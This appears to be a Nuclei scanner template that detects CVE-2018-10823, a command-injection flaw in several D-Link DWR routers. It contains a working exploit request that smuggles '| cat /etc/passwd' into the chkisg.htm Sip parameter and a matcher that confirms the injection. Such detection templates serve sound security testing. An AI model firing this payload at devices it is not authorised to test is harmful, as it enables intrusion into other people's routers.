id: CVE-2018-10823

info:
  name: D-Link Routers - Remote Command Injection
  author: wisnupramoedya
  severity: high
  description: |
    D-Link DWR-116 through 1.06, DWR-512 through 2.02, DWR-712 through 2.02, DWR-912 through 2.02, DWR-921 through 2.02, and DWR-111 through 1.01 device may allow an authenticated attacker to execute arbitrary code by injecting the shell command into the chkisg.htm page Sip parameter. This allows for full control over the device internals.
  remediation: |
    Apply the latest firmware update provided by D-Link to mitigate this vulnerability.
  reference:
    - https://www.exploit-db.com/exploits/45676
    - https://nvd.nist.gov/vuln/detail/CVE-2018-10823
    - https://seclists.org/fulldisclosure/2018/Oct/36
    - http://sploit.tech/2018/10/12/D-Link.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-10823
    cwe-id: CWE-78
    epss-score: 0.96827
    epss-percentile: 0.99591
    cpe: cpe:2.3:o:dlink:dwr-116_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dlink
    product: dwr-116_firmware
  tags: cve2018,rce,iot,dlink,router,edb,seclists,cve

http:
  - method: GET
    path:
      - "{{BaseURL}}/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 490a0046304402204f4c2a09fb2418a1beedeafab1d89c3ca2fc0ec0506a2c12bf210a918b8c8b5c022010431b1c8111cb4ba36005e6589515c621fe7d47b50c95fc8955f8f1eb74f563:922c64590222798bb761d5b6d8e72950